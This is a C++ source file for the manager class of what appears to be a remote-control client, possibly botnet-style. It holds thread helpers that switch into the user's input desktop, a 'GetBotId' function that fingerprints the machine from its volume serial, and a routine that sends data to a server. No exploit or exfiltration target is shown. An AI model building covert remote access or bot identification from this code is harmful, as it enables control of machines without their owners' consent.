// Manager.cpp: implementation of the CManager class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "Manager.h"
#include "IOCPClient.h"
#include <process.h>

typedef struct {
	unsigned(__stdcall* start_address)(void*);
	void* arglist;
	bool	bInteractive; // 是否支持交互桌面
	HANDLE	hEventTransferArg;
} THREAD_ARGLIST, * LPTHREAD_ARGLIST;

HDESK SelectDesktop(TCHAR* name);

unsigned int __stdcall ThreadLoader(LPVOID param)
{
	unsigned int	nRet = 0;
	try {
		THREAD_ARGLIST	arg;
		memcpy(&arg, param, sizeof(arg));
		SetEvent(arg.hEventTransferArg);
		// 与卓面交互
		if (arg.bInteractive)
			SelectDesktop(NULL);

		nRet = arg.start_address(arg.arglist);
	}
	catch (...) {
	};
	return nRet;
}

HANDLE MyCreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, // SD
	SIZE_T dwStackSize,                       // initial stack size
	LPTHREAD_START_ROUTINE lpStartAddress,    // thread function
	LPVOID lpParameter,                       // thread argument
	DWORD dwCreationFlags,                    // creation option
	LPDWORD lpThreadId, bool bInteractive)
{
	HANDLE	hThread = INVALID_HANDLE_VALUE;
	THREAD_ARGLIST	arg;
	arg.start_address = (unsigned(__stdcall*)(void*))lpStartAddress;
	arg.arglist = (void*)lpParameter;
	arg.bInteractive = bInteractive;
	arg.hEventTransferArg = CreateEvent(NULL, false, false, NULL);
	hThread = (HANDLE)_beginthreadex((void*)lpThreadAttributes, dwStackSize, ThreadLoader, &arg, dwCreationFlags, (unsigned*)lpThreadId);
	WaitForSingleObject(arg.hEventTransferArg, INFINITE);
	CloseHandle(arg.hEventTransferArg);

	return hThread;
}

ULONG PseudoRand(ULONG* seed)
{
	return (*seed = 1352459 * (*seed) + 2529004207);
}

std::string GetBotId()
{
#define _T(p) p
	TCHAR botId[35] = { 0 };
	TCHAR windowsDirectory[MAX_PATH] = {};
	TCHAR volumeName[8] = { 0 };
	DWORD seed = 0;

	if (GetWindowsDirectory(windowsDirectory, sizeof(windowsDirectory)))
		windowsDirectory[0] = _T('C');

	volumeName[0] = windowsDirectory[0];
	volumeName[1] = _T(':');
	volumeName[2] = _T('\\');
	volumeName[3] = _T('\0');

	GetVolumeInformation(volumeName, NULL, 0, &seed, 0, NULL, NULL, 0);

	GUID guid = {};
	guid.Data1 = PseudoRand(&seed);

	guid.Data2 = (USHORT)PseudoRand(&seed);
	guid.Data3 = (USHORT)PseudoRand(&seed);
	for (int i = 0; i < 8; i++)
		guid.Data4[i] = (UCHAR)PseudoRand(&seed);
	wsprintf(botId, _T("%08lX%04lX%lu"), guid.Data1, guid.Data3, *(ULONG*)&guid.Data4[2]);
	return botId;
#undef _T(p)
}

BOOL SelectHDESK(HDESK new_desktop)
{
	HDESK old_desktop = GetThreadDesktop(GetCurrentThreadId());

	DWORD dummy;
	char new_name[256];

	if (!GetUserObjectInformation(new_desktop, UOI_NAME, &new_name, 256, &dummy)) {
		return FALSE;
	}

	// Switch the desktop
	if (!SetThreadDesktop(new_desktop)) {
		return FALSE;
	}

	// Switched successfully - destroy the old desktop
	CloseDesktop(old_desktop);

	return TRUE;
}

// - SelectDesktop(char *)
// Switches the current thread into a different desktop, by name
// Calling with a valid desktop name will place the thread in that desktop.
// Calling with a NULL name will place the thread in the current input desktop.
HDESK SelectDesktop(TCHAR* name)
{
	HDESK desktop = NULL;

	if (name != NULL) {
		// Attempt to open the named desktop
		desktop = OpenDesktop(name, 0, FALSE,
			DESKTOP_CREATEMENU | DESKTOP_CREATEWINDOW |
			DESKTOP_ENUMERATE | DESKTOP_HOOKCONTROL |
			DESKTOP_WRITEOBJECTS | DESKTOP_READOBJECTS |
			DESKTOP_SWITCHDESKTOP | GENERIC_WRITE);
	}
	else {
		// No, so open the input desktop
		desktop = OpenInputDesktop(0, FALSE,
			DESKTOP_CREATEMENU | DESKTOP_CREATEWINDOW |
			DESKTOP_ENUMERATE | DESKTOP_HOOKCONTROL |
			DESKTOP_WRITEOBJECTS | DESKTOP_READOBJECTS |
			DESKTOP_SWITCHDESKTOP | GENERIC_WRITE);
	}

	// Did we succeed?
	if (desktop == NULL) {
		return NULL;
	}

	// Switch to the new desktop
	if (!SelectHDESK(desktop)) {
		// Failed to enter the new desktop, so free it!
		CloseDesktop(desktop);
		return NULL;
	}

	// We successfully switched desktops!
	return desktop;
}

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CManager::CManager(IOCPClient* ClientObject) : g_bExit(ClientObject->GetState())
{
	m_bReady = TRUE;
	m_ClientObject = ClientObject;
	m_ClientObject->setManagerCallBack(this, IOCPManager::DataProcess);

	m_hEventDlgOpen = CreateEvent(NULL,TRUE,FALSE,NULL);
}

CManager::~CManager()
{
	if (m_hEventDlgOpen!=NULL)
	{
		CloseHandle(m_hEventDlgOpen);
		m_hEventDlgOpen = NULL;
	}
}


int CManager::Send(LPBYTE lpData, UINT nSize)
{
	int	nRet = 0;
	try
	{
		nRet = m_ClientObject->Send2Server((char*)lpData, nSize);
	}catch(...){
		Mprintf("[ERROR] CManager::Send catch an error \n");
	};
	return nRet;
}

VOID CManager::WaitForDialogOpen()
{
	WaitForSingleObject(m_hEventDlgOpen, 8000);
	//必须的Sleep,因为远程窗口从InitDialog中发送COMMAND_NEXT到显示还要一段时间
	Sleep(150);
}

VOID CManager::NotifyDialogIsOpen()
{
	SetEvent(m_hEventDlgOpen);
}
